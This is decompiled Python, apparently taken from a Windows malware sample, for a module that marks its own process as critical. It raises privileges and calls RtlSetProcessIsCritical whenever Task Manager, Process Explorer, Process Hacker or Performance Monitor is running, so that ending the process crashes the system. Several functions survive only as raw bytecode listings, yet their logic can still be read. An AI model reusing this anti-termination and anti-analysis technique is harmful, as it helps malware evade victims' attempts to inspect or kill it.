# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: Core\Settings\CriticalProcess.py
import ctypes, subprocess

def SetProtection():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0


def UnsetProtection():
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0


def Processlist--- This code section failed: ---

 L.  20         0  BUILD_LIST_0          0 
                2  STORE_FAST               'Processes'

 L.  21         4  LOAD_GLOBAL              subprocess
                6  LOAD_ATTR                check_output
                8  LOAD_STR                 '@chcp 65001 1> nul && @tasklist /fi "STATUS eq RUNNING" | find /V "Image Name" | find /V "="'

 L.  22        10  LOAD_CONST               True
               12  LOAD_GLOBAL              subprocess
               14  LOAD_ATTR                DEVNULL
               16  LOAD_GLOBAL              subprocess
               18  LOAD_ATTR                DEVNULL

 L.  21        20  LOAD_CONST               ('shell', 'stderr', 'stdin')
               22  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               24  LOAD_ATTR                decode

 L.  22        26  LOAD_STR                 'utf-8'
               28  LOAD_STR                 'strict'

 L.  21        30  LOAD_CONST               ('encoding', 'errors')
               32  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               34  STORE_FAST               'Process'

 L.  23        36  LOAD_FAST                'Process'
               38  LOAD_METHOD              split
               40  LOAD_STR                 ' '
               42  CALL_METHOD_1         1  ''
               44  GET_ITER         
             46_0  COME_FROM            56  '56'
               46  FOR_ITER             90  'to 90'
               48  STORE_FAST               'ProcessName'

 L.  24        50  LOAD_STR                 '.exe'
               52  LOAD_FAST                'ProcessName'
               54  <118>                 0  ''
               56  POP_JUMP_IF_FALSE    46  'to 46'

 L.  25        58  LOAD_FAST                'ProcessName'
               60  LOAD_METHOD              replace
               62  LOAD_STR                 'K\r\n'
               64  LOAD_STR                 ''
               66  CALL_METHOD_2         2  ''
               68  LOAD_METHOD              replace
               70  LOAD_STR                 '\r\n'
               72  LOAD_STR                 ''
               74  CALL_METHOD_2         2  ''
               76  STORE_FAST               'proc'

 L.  26        78  LOAD_FAST                'Processes'
               80  LOAD_METHOD              append
               82  LOAD_FAST                'proc'
               84  CALL_METHOD_1         1  ''
               86  POP_TOP          
               88  JUMP_BACK            46  'to 46'

 L.  27        90  LOAD_FAST                'Processes'
               92  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `<118>' instruction at offset 54


def BlacklistedProcesses--- This code section failed: ---

 L.  33         0  LOAD_CONST               ('processhacker.exe', 'procexp64.exe', 'taskmgr.exe', 'perfmon.exe')
                2  STORE_FAST               'Blacklist'

 L.  37         4  LOAD_GLOBAL              Processlist
                6  CALL_FUNCTION_0       0  ''
                8  GET_ITER         
             10_0  COME_FROM            24  '24'
               10  FOR_ITER             34  'to 34'
               12  STORE_FAST               'Process'

 L.  38        14  LOAD_FAST                'Process'
               16  LOAD_METHOD              lower
               18  CALL_METHOD_0         0  ''
               20  LOAD_FAST                'Blacklist'
               22  <118>                 0  ''
               24  POP_JUMP_IF_FALSE    10  'to 10'

 L.  39        26  POP_TOP          
               28  LOAD_CONST               True
               30  RETURN_VALUE     
               32  JUMP_BACK            10  'to 10'

 L.  41        34  LOAD_CONST               False
               36  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `<118>' instruction at offset 22


def ProcessChecker--- This code section failed: ---
              0_0  COME_FROM            24  '24'

 L.  48         0  LOAD_GLOBAL              BlacklistedProcesses
                2  CALL_FUNCTION_0       0  ''
                4  LOAD_CONST               True
                6  <117>                 0  ''
                8  POP_JUMP_IF_FALSE    16  'to 16'

 L.  49        10  LOAD_GLOBAL              SetProtection
               12  CALL_FUNCTION_0       0  ''
               14  POP_TOP          
             16_0  COME_FROM             8  '8'

 L.  51        16  LOAD_GLOBAL              BlacklistedProcesses
               18  CALL_FUNCTION_0       0  ''
               20  LOAD_CONST               False
               22  <117>                 0  ''
               24  POP_JUMP_IF_FALSE     0  'to 0'

 L.  52        26  LOAD_GLOBAL              UnsetProtection
               28  CALL_FUNCTION_0       0  ''
               30  POP_TOP          
               32  JUMP_BACK             0  'to 0'

Parse error at or near `<117>' instruction at offset 6